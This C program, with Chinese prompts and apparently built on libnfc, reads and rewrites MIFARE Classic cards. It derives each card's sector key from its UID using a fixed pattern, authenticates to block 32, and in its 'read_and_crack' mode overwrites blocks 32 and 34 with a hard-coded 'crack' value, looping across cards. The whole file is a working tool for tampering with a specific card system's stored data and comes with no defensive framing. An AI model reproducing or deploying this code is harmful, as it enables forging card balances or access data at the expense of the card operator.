#if defined(HAVE_CONFIG_H)
    #include "config.h"
#endif

#include <stdlib.h>
#include <err.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <stdio.h>
#include <nfc/nfc.h>
#include <freefare.h>
#include "mifare.h"
#include "nfc-utils.h"

static mifare_param mp;
static nfc_device *pnd;
static nfc_target nt;
static nfc_context *context;
static mifare_cmd mc;
static uint8_t uid[4];
static uint8_t key[6];

const nfc_modulation nmMifare = {
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106,
};

void init(void){
    nfc_init(&context);
    if (context == NULL) {
	printf("libnfc初始化失败！\n");
	exit(EXIT_FAILURE);
    }
    
    pnd = nfc_open(context, NULL); 
    if (pnd == NULL) {
	printf("错误: %s\n", "你确定插好读卡器了？");
	exit(EXIT_FAILURE);
    }
    
    if (nfc_initiator_init(pnd) < 0) {
	nfc_perror(pnd, "nfc_initiator_init");
	exit(EXIT_FAILURE);
    }
 
    printf("NFC 读卡器: %s 已打开\n", nfc_device_get_name(pnd));
}

void read_and_crack(void){ 
    printf("\n寻找卡片中...\n");
    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
    memcpy(uid,nt.nti.nai.abtUid,4);
    //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
    printf("找到卡片！UID = ");
    print_hex(uid,4);
    memcpy(mp.mpa.abtAuthUid,uid,4);
    //生成key
    key[0]=0xab;
    for(int i=1;i<5;i++){
	key[i]=uid[i-1];
    }
    key[5]=0x0b;
    mc = MC_AUTH_A;    
    //memcpy(mp.mpa.abtKey, key,6);
    //uint8_t *temp;
    memcpy(mp.mpa.abtKey, key,6);
    uint32_t block=32;		//应读取block 32 和 block 34
    if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
    	printf("密钥验证错误！\n");
    }else{
    	printf("成功验证密钥！\n");
    	mc = MC_READ;
	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
		printf("读取到的数据：\n");
		print_hex(mp.mpd.abtData,16);
		//putchar('\n');
		mc = MC_WRITE;
		uint8_t crack[16]={0x43,0x53,0x49,0x08,0x02,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x00,0xAE};
		memcpy(mp.mpd.abtData,crack,16);
		if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp) && nfc_initiator_mifare_cmd(pnd, mc, block+2, &mp)){
			printf("修改成功！\n\n");
			sleep(1.5);
			read_and_crack();
		}else{
			printf("修改失败！\n\n");
		}

	}else{
		printf("读取失败！\n");
	}
    }
    
    }

void read_only(void){
    LOP1:    
    printf("\n寻找卡片中...\n");
    while(nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &nt)<=0){}
    memcpy(uid,nt.nti.nai.abtUid,4);
    //aeny(mp.mpa.abtAuthUid, nt.nti.nai.abtUid + nt.nti.nai.szUidLen - 4, 4);
    printf("找到卡片！UID = ");
    print_hex(uid,4);
    memcpy(mp.mpa.abtAuthUid,uid,4);
    //生成key
    key[0]=0xab;
    for(int i=1;i<5;i++){
	key[i]=uid[i-1];
    }
    key[5]=0x0b;
    mc = MC_AUTH_A;    
    //memcpy(mp.mpa.abtKey, key,6);
    //uint8_t *temp;
    memcpy(mp.mpa.abtKey, key,6);
    uint32_t block=32;		//应读取block 32 和 block 34
    if(!nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
    	printf("密钥验证错误！\n");
    }else{
    	printf("成功验证密钥！\n");
    	mc = MC_READ;
	if(nfc_initiator_mifare_cmd(pnd, mc, block, &mp)){
		printf("读取到的数据：\n");
		print_hex(mp.mpd.abtData,16);
		putchar('\n');
		sleep(1.5);
		read_only();
	}else{
		printf("读取失败！\n");
	}
    }
    
}

int main(){
    init();
    printf("选择要进入的模式:\n	1.读取后修改		2.只读取不修改\n");
    int ch;
    scanf("%d",&ch);
    switch(ch){
	case 1 :read_and_crack();break;
	case 2 :read_only();break;
	default :printf("错误输入！\n");
		exit(0);
    }

}
